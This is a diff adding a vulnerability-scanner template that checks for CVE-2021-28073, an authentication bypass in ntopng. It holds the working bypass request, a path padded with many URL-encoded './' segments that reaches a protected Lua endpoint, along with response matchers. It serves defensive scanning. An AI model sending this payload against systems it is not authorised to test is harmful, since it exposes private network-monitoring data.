@@ -1,0 +1,34 @@
+id: "ntopng-auth-bypass"
+name: "Ntopng Authentication Bypass"
+severity: "critical"
+description: "Ntopng, a passive network monitoring tool, contains an authentication bypass vulnerability in ntopng <= 4.2"
+tech:
+  - "generic"
+tags:
+  - "ntopng"
+  - "vuln"
+cve: "CVE-2021-28073"
+reference: "http://noahblog.360.cn/ntopng-multiple-vulnerabilities/"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/lua/%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2ffind_prefs.lua.css"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "word"
+    part: "header"
+    words:
+      - "application/json"
+  - type: "word"
+    part: "body"
+    words:
+      - "\"results\":"
+      - "\"name\":"
+      - "\"tab\":"
+    condition: "and"
+  - type: "status"
+    status:
+      - 200
